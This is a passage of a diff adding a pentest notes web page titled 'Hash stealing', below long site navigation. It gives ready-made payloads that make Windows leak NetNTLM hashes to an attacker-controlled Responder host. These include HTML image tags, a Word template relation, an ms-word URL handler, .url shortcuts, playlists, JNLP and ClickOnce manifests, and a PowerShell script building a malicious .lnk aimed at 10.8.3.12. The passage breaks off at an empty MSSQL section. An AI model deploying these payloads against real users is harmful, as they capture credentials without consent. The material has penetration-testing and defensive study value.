+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+		</div>
+		
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="page-links">
+  <h3>On this page</h3>
+    <nav id="toc">
+  <ul>
+    <li><a href="#internet-explorer--edge">Internet Explorer &amp; Edge</a></li>
+    <li><a href="#office">Office</a></li>
+    <li><a href="#living-off-the-land">Living off the land</a></li>
+    <li><a href="#url-handlers">URL handlers</a></li>
+    <li><a href="#internet-shortcut">Internet Shortcut</a></li>
+    <li><a href="#windows-media-player">Windows Media Player</a></li>
+    <li><a href="#java-web-start">Java Web Start</a></li>
+    <li><a href="#clickonce">ClickOnce</a></li>
+  </ul>
+</nav>
+</div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+			<h1>Hash stealing</h1>
+			
+			<nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation">
+				<details>
+    <summary>On this page</summary>
+    <div class="page-links">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#internet-explorer--edge">Internet Explorer &amp; Edge</a></li>
+    <li><a href="#office">Office</a></li>
+    <li><a href="#living-off-the-land">Living off the land</a></li>
+    <li><a href="#url-handlers">URL handlers</a></li>
+    <li><a href="#internet-shortcut">Internet Shortcut</a></li>
+    <li><a href="#windows-media-player">Windows Media Player</a></li>
+    <li><a href="#java-web-start">Java Web Start</a></li>
+    <li><a href="#clickonce">ClickOnce</a></li>
+  </ul>
+</nav>
+    </div>
+  </details>
+
+			</nav>
+			<h2 id="internet-explorer--edge">Internet Explorer &amp; Edge<a href="#internet-explorer--edge" class="anchor" aria-hidden="true">#</a> </h2>
+<p>While the <code>dir</code> command can be used to leak hashes, it is not very convenient method for an attacker. A more likely scenario would be if the attacker entices the victim to visit the attacker&rsquo;s website or open a specially crafted file. As is widely known, Internet Explorer can leak NetNTLM hashes to websites containing embedded content (eg, images, stylesheets) loaded from a UNC path. This also applies to Microsoft Edge, which can be abused in the same way. This can be tested using the following HTML:</p>
+<p><strong><em><a href="https://www.datocms-assets.com/21957/1592981084-leak.htm">leak.htm</a>:</em></strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;file://&lt;responder ip&gt;/leak/leak.png&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h2 id="office">Office<a href="#office" class="anchor" aria-hidden="true">#</a> </h2>
+<p>Another well-known attack is by abusing Office. Office documents can contain links to external content that when pointed to a network share can result in disclosing NetNTLM hashes. For example, a Word document can contain a link to a template file located on a share. The template file can be set via the <code>word\_rels\settings.xml.rels</code> file located in the <code>DOCX</code> file.</p>
+<p><em><strong><a href="https://www.datocms-assets.com/21957/1592981117-leak.docx">word_rels\settings.xml.rels</a>:</strong></em></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">Relationships</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">Relationship</span> <span class="na">Id</span><span class="o">=</span><span class="s">&#34;rId1&#34;</span> <span class="na">Type</span><span class="o">=</span><span class="s">&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&#34;</span> <span class="na">Target</span><span class="o">=</span><span class="s">&#34;file://&lt;responder ip&gt;/leak/Template.dotx&#34;</span> <span class="na">TargetMode</span><span class="o">=</span><span class="s">&#34;External&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">Relationships</span><span class="p">&gt;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>
+
+<img
+  src="/1592477905-wordntlmleaktemplate_9182386511731267501_hu13097742063005342707.webp"
+  width="439"
+  height="248"
+  decoding="async"
+  fetchpriority="auto"
+  loading="lazy"
+  alt=""id="h-rh-i-0"
+/>
+<em>Figure 2: leak NetNTLM hashes using Word</em></p>
+<p>It should be noted that this particular trick doesn&rsquo;t work if the Word document is opened in Protected View. This is normally the case if the document is opened from a website or opened from an email message.</p>
+<h2 id="living-off-the-land">Living off the land<a href="#living-off-the-land" class="anchor" aria-hidden="true">#</a> </h2>
+<p>If no mitigations have been applied, it is not very hard to trick Windows to leak hashes. Essentially any document format that allows loading of external files from UNC paths should be affected by this flaw. To get an idea how easy it is to find such methods, a number of them are listed below. This is by far an exhaustive list, it just demonstrates how prevalent this issue is. Of course an attacker still needs to entice the user into performing a certain action.</p>
+<h2 id="url-handlers">URL handlers<a href="#url-handlers" class="anchor" aria-hidden="true">#</a> </h2>
+<p>Besides abusing files there are other ways to force applications to open files from (rogue) network shares. One such way is with the use of URL handlers. A large number of applications register custom URL schemes. For example, Word registers the <code>ms-word</code> URL scheme. This scheme accepts a path that can be used to cause Word to try to open a file from a UNC path. Consequently, the <code>ms-word</code> URL scheme can be used to steal NetNTLM hashes. Other URL handlers can be abused in a similar manner.</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;ms-word:ofe|u|\\&lt;responder ip&gt;\leak\leak.docx&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h2 id="internet-shortcut">Internet Shortcut<a href="#internet-shortcut" class="anchor" aria-hidden="true">#</a> </h2>
+<p>Another trick is to just create a shortcut to the rogue share. Windows has a special <code>URL</code> file type that is used to create shortcuts to webpages. A simple version looks something like this:</p>
+<p><strong><em><a href="https://www.datocms-assets.com/21957/1592981144-leak.url">leak.url</a>:</em></strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code>[InternetShortcut]
+URL=file://&lt;responder ip&gt;/leak/leak.html</code></pre>
+  </figure>
+</div>
+<p>It is possible to assign an icon to this shortcut. When Windows Explorer encounters a URL file it will automatically parse it to see if there is an icon associated to the shortcut. Setting the icon to an UNC path will cause Windows Explorer to try and load it, again leaking hashes. This happens when the user just browses to the folder containing the URL file. So if an attacker managers to drop a URL file in the user&rsquo;s download folder, hashes are leaked every time the user views the download folder in Explorer. Similar attacks are possible using other shortcut type of file formats, which is also useful with USB drops.</p>
+<p><strong><em>leak2.url:</em></strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code>[InternetShortcut]
+URL=https://securify.nl
+IconIndex=0
+IconFile=\\&lt;responder ip&gt;\leak\leak.ico</code></pre>
+  </figure>
+</div>
+<h2 id="windows-media-player">Windows Media Player<a href="#windows-media-player" class="anchor" aria-hidden="true">#</a> </h2>
+<p>Media players tend to support many audio and video file formats and playlists. Playlists can be seen as a collection of links to external files, including files located on network shares. Naturally this can be abused to steal NetNTLM hashes. Windows Media Player is no exception, opening a specially crafted playlist in Windows Media Player can potentially disclose hashes to an attacker.</p>
+<p><em><strong><a href="https://www.datocms-assets.com/21957/1592981177-leak.m3u">leak.m3u</a>:</strong></em></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code>#EXTM3U
+#EXTINF:1337, Leak
+\\&lt;responder ip&gt;\leak.mp3</code></pre>
+  </figure>
+</div>
+<p><em><strong><a href="https://www.datocms-assets.com/21957/1592981202-leak.asx">leak.asx</a>:</strong></em></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">asx</span> <span class="na">version</span><span class="o">=</span><span class="s">&#34;3.0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Leak<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">entry</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">ref</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;file://&lt;responder ip&gt;/leak/leak.wma&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">entry</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">asx</span><span class="p">&gt;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>_<strong>[leak.wax]:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">https://10.8.3.12/test
+</span></span><span class="line"><span class="cl">file://<span class="se">\\</span>10.8.3.12/steal/file</span></span></code></pre></div>
+  </figure>
+</div>
+<h2 id="java-web-start">Java Web Start<a href="#java-web-start" class="anchor" aria-hidden="true">#</a> </h2>
+<p>Many enterprise still use Java applications. There is a good chance that they also have Java Web Start enabled. Java Web Start allows users to start Java applications from the internet using a browser. A Java Web Start application is launched by opening a JNLP file. JNLP files are XML files that define how the application should be started. It also contains links to one or more JAR files. These JAR files could be located on network shares thus are a good target for leaking hashes.</p>
+<p><em><strong><a href="https://www.datocms-assets.com/21957/1592981769-leak.jnlp">leak.jnlp</a>:</strong></em></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">jnlp</span> <span class="na">spec</span><span class="o">=</span><span class="s">&#34;1.0+&#34;</span> <span class="na">codebase</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">resources</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">jar</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;file://&lt;responder ip&gt;/leak/leak.jar&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">resources</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">application-desc</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">jnlp</span><span class="p">&gt;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>It should be noted that while JNLP files can be opened from a browser they are block by Microsoft Outlook on Windows. JNLP files are allowed on Outlook for macOS though.</p>
+<p>
+
+<img
+  src="/1592477933-outlookblocksjnlp_10563183382737444597_hu8459947631052636626.webp"
+  width="848"
+  height="406"
+  decoding="async"
+  fetchpriority="auto"
+  loading="lazy"
+  alt=""id="h-rh-i-1"
+/> <em>Figure 3: JNLP files are blocked in Outlook</em></p>
+<h2 id="clickonce">ClickOnce<a href="#clickonce" class="anchor" aria-hidden="true">#</a> </h2>
+<p>.NET&rsquo;s counterpart to Java Web Start is named ClickOnce. It works in a similar manner, applications are started via a ClickOnce deployment manifest file. These files can also contain UNC paths, similar to Java Web Start. Remarkably, ClickOnce deployment manifests are not blocked by Outlook.</p>
+<p>
+
+<img
+  src="/1592477936-outlookclickonceallowed_7110036053773317615_hu4233685717014523818.webp"
+  width="848"
+  height="406"
+  decoding="async"
+  fetchpriority="auto"
+  loading="lazy"
+  alt=""id="h-rh-i-2"
+/> <em>Figure 4: ClickOnce deployment manifest files are not blocked in Outlook</em></p>
+<p><em><strong><a href="https://www.datocms-assets.com/21957/1592982308-leak.application">leak.application</a>:</strong></em></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">asmv1:assembly</span> <span class="na">xsi:schemaLocation</span><span class="o">=</span><span class="s">&#34;urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd&#34;</span> <span class="na">manifestVersion</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span> <span class="na">xmlns:dsig</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2000/09/xmldsig#&#34;</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&#34;urn:schemas-microsoft-com:asm.v2&#34;</span> <span class="na">xmlns:asmv1</span><span class="o">=</span><span class="s">&#34;urn:schemas-microsoft-com:asm.v1&#34;</span> <span class="na">xmlns:asmv2</span><span class="o">=</span><span class="s">&#34;urn:schemas-microsoft-com:asm.v2&#34;</span> <span class="na">xmlns:xrml</span><span class="o">=</span><span class="s">&#34;urn:mpeg:mpeg21:2003:01-REL-R-NS&#34;</span> <span class="na">xmlns:xsi</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">assemblyIdentity</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;Leak.app&#34;</span> <span class="na">version</span><span class="o">=</span><span class="s">&#34;1.0.0.0&#34;</span> <span class="na">publicKeyToken</span><span class="o">=</span><span class="s">&#34;0000000000000000&#34;</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;neutral&#34;</span> <span class="na">processorArchitecture</span><span class="o">=</span><span class="s">&#34;x86&#34;</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&#34;urn:schemas-microsoft-com:asm.v1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">description</span> <span class="na">asmv2:publisher</span><span class="o">=</span><span class="s">&#34;Leak&#34;</span> <span class="na">asmv2:product</span><span class="o">=</span><span class="s">&#34;Leak&#34;</span> <span class="na">asmv2:supportUrl</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&#34;urn:schemas-microsoft-com:asm.v1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">deployment</span> <span class="na">install</span><span class="o">=</span><span class="s">&#34;false&#34;</span> <span class="na">mapFileExtensions</span><span class="o">=</span><span class="s">&#34;true&#34;</span> <span class="na">trustURLParameters</span><span class="o">=</span><span class="s">&#34;true&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">dependency</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;</span><span class="nt">dependentAssembly</span> <span class="na">dependencyType</span><span class="o">=</span><span class="s">&#34;install&#34;</span> <span class="na">codebase</span><span class="o">=</span><span class="s">&#34;file://&lt;responder ip&gt;/leak/Leak.exe.manifest&#34;</span> <span class="na">size</span><span class="o">=</span><span class="s">&#34;32909&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="nt">assemblyIdentity</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;Leak.exe&#34;</span> <span class="na">version</span><span class="o">=</span><span class="s">&#34;1.0.0.0&#34;</span> <span class="na">publicKeyToken</span><span class="o">=</span><span class="s">&#34;0000000000000000&#34;</span> <span class="na">language</span><span class="o">=</span><span class="s">&#34;neutral&#34;</span> <span class="na">processorArchitecture</span><span class="o">=</span><span class="s">&#34;x86&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;win32&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;</span><span class="nt">hash</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;</span><span class="nt">dsig:Transforms</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">&lt;</span><span class="nt">dsig:Transform</span> <span class="na">Algorithm</span><span class="o">=</span><span class="s">&#34;urn:schemas-microsoft-com:HashTransforms.Identity&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;/</span><span class="nt">dsig:Transforms</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;</span><span class="nt">dsig:DigestMethod</span> <span class="na">Algorithm</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/2000/09/xmldsig#sha1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">&lt;</span><span class="nt">dsig:DigestValue</span><span class="p">&gt;</span>ESZ11736AFIJnp6lKpFYCgjw4dU=<span class="p">&lt;/</span><span class="nt">dsig:DigestValue</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">&lt;/</span><span class="nt">hash</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">&lt;/</span><span class="nt">dependentAssembly</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">&lt;/</span><span class="nt">dependency</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">asmv1:assembly</span><span class="p">&gt;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>_<strong>[Malicious ink (SMB)]:</strong></p>
+<ul>
+<li>Create a malicious that connect to our responder .</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">$objShell</span> <span class="o">=</span> New-Object -ComObject WScript.Shell
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span> <span class="o">=</span> <span class="nv">$objShell</span>.CreateShortcut<span class="o">(</span><span class="s2">&#34;C:\Malicious.lnk&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.TargetPath <span class="o">=</span> <span class="s2">&#34;\\10.8.3.12\@threat.png&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.WindowStyle <span class="o">=</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.IconLocation <span class="o">=</span> <span class="s2">&#34;%windir%\system32\shell32.dll, 3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.Description <span class="o">=</span> <span class="s2">&#34;Browsing to the dir this file lives in will perform an authentication request.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.HotKey <span class="o">=</span> <span class="s2">&#34;Ctrl+Alt+O&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.Save<span class="o">()</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>_<strong>[MSSQL]:</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
